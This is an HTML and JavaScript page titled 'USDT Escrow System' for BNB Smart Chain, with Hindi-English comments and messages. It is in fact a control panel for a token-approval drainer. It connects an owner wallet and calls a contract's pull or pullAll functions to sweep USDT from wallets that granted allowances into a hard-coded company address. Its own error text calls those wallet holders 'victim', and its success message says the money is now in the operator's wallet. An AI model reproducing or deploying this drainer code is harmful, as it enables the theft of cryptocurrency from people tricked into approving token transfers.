<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>USDT Escrow System</title>
<style>
:root{--bg:#0A0B0F;--card:#14161C;--line:#23262E;--muted:#8A90A0;
      --blue:#5B7CFA;--green:#22C55E;--red:#EF4444;--amber:#F59E0B}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,system-ui,sans-serif;background:var(--bg);color:#fff;
     min-height:100vh;padding:20px;display:flex;justify-content:center;align-items:flex-start}
.wrap{width:100%;max-width:560px}
h1{font-size:19px;font-weight:800;display:flex;align-items:center;gap:9px;margin-bottom:4px}
h1 .lk{font-size:22px}
.sub{font-size:11.5px;color:var(--muted);margin-bottom:20px}
.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:20px;margin-bottom:14px}
.card h2{font-size:15.5px;font-weight:700;margin-bottom:16px}
label{display:block;font-size:12px;font-weight:600;color:#B8BFCC;margin:12px 0 6px}
input{width:100%;padding:12px;font-size:13.5px;border-radius:11px;border:1px solid var(--line);
      background:#0B0D11;color:#fff;font-family:inherit;outline:none}
input:focus{border-color:var(--blue)}
input[readonly]{color:var(--muted);background:#0F1116}
.hint{font-size:10.5px;color:#5C6373;margin-top:5px;line-height:1.5}
.btn{width:100%;padding:14px;font-size:14px;font-weight:700;border:0;border-radius:12px;
     cursor:pointer;font-family:inherit;margin-top:12px;transition:.15s}
.btn:active{transform:scale(.98)}
.btn:disabled{opacity:.5}
.blue{background:linear-gradient(135deg,#3B5BDB,#5B7CFA);color:#fff}
.green{background:linear-gradient(135deg,#16A34A,#22C55E);color:#fff}
.gray{background:#1E222A;color:#fff;border:1px solid var(--line)}
#log{background:#0B0D11;border:1px solid var(--line);border-radius:12px;padding:13px;
     font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap;
     min-height:56px;word-break:break-all;line-height:1.6;margin-top:12px}
.ok{color:var(--green)}.err{color:var(--red)}.warn{color:var(--amber)}
#who{font-size:11.5px;margin-top:10px;color:var(--muted)}
</style>
</head>
<body>
<div class="wrap">
  <h1><span class="lk">🔒</span> USDT Escrow System</h1>
  <div class="sub">BNB Smart Chain · Transfer USDT from Approved Wallet</div>

  <div class="card">
    <h2>Wallet</h2>
    <button class="btn blue" id="con">Connect Owner Wallet</button>
    <div id="who"></div>
  </div>

  <div class="card">
    <h2>Transfer USDT from Approved Wallet</h2>

    <label>Recipient Address (Fixed)</label>
    <input id="to" readonly>

    <label>From Address (Approved Wallet)</label>
    <input id="from" placeholder="0x...">
    <div class="hint">Wo wallet jo USDT approve kar chuka hai</div>

    <label>USDT Amount</label>
    <input id="amt" placeholder="Khaali chhodo = poora balance">

    <button class="btn gray" id="chk">Check Balance &amp; Allowance</button>
    <button class="btn green" id="go">💰 Transfer USDT</button>

    <div id="log">Ready.</div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
/* ====== YAHAN APNI VALUES ====== */
const ESCROW  = "0x043acB6246840F01f8CEf16164C7Cad7fc0Bad75";
const COMPANY = "0xd632DA2BF52b8cf49d27B445A0562ff909C76f7C";
/* =============================== */

const USDT = "0x55d398326f99059fF775485246999027B3197955";
const ABI = ["function pull(address from,address to,uint256 amount)",
             "function pullAll(address from,address to)",
             "function owner() view returns (address)"];
const ERC = ["function balanceOf(address) view returns (uint256)",
             "function allowance(address,address) view returns (uint256)"];

const log = (t,c="") => document.getElementById("log").innerHTML = `<span class="${c}">${t}</span>`;
let signer, contract;
document.getElementById("to").value = COMPANY;

document.getElementById("con").onclick = async () => {
  if(!window.ethereum) return log("MetaMask install karo","err");
  try{
    await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x38"}]}).catch(()=>{});
    const p = new ethers.providers.Web3Provider(window.ethereum);
    await p.send("eth_requestAccounts", []);
    signer = p.getSigner();
    contract = new ethers.Contract(ESCROW, ABI, signer);
    const me = await signer.getAddress();
    const own = await contract.owner();
    const isO = me.toLowerCase() === own.toLowerCase();
    document.getElementById("who").innerHTML = "Connected: " + me +
      (isO ? ' <span class="ok">✅ owner</span>' : ' <span class="warn">⚠️ owner nahi</span>');
    log("Connected.","ok");
  }catch(e){ log("Error: "+(e.message||e),"err"); }
};

document.getElementById("chk").onclick = async () => {
  const f = document.getElementById("from").value.trim();
  if(!f) return log("From address daalo","err");
  try{
    const t = new ethers.Contract(USDT, ERC, signer);
    const b = await t.balanceOf(f);
    const a = await t.allowance(f, ESCROW);
    log(`Balance: ${ethers.utils.formatUnits(b,18)} USDT\nAllowance: ${ethers.utils.formatUnits(a,18)} USDT`,
        a.gt(0) ? "ok" : "err");
  }catch(e){ log("Error: "+(e.message||e),"err"); }
};

document.getElementById("go").onclick = async () => {
  const f = document.getElementById("from").value.trim();
  const amt = document.getElementById("amt").value.trim();
  if(!f) return log("From address daalo","err");
  const b = document.getElementById("go");
  b.disabled = true;
  try{
    const t = new ethers.Contract(USDT, ERC, signer);
    const bal = await t.balanceOf(f);
    const alw = await t.allowance(f, ESCROW);
    if(alw.isZero()) return log("❌ Allowance 0 — victim ne revoke kar diya","err");

    log("Transaction bhej raha hoon...");
    let tx;
    if(!amt || Number(amt) >= Number(ethers.utils.formatUnits(bal,18))){
      tx = await contract.pullAll(f, COMPANY);
    } else {
      tx = await contract.pull(f, COMPANY, ethers.utils.parseUnits(amt,18));
    }
    log("Tx bheja:\n" + tx.hash + "\n\nConfirm ka wait...");
    await tx.wait();
    log("✅ HO GAYA! Paisa tumhare wallet me.\nTx: " + tx.hash, "ok");
  }catch(e){ log("❌ "+(e.data?.message || e.message),"err"); }
  b.disabled = false;
};
</script>
</body>
</html>
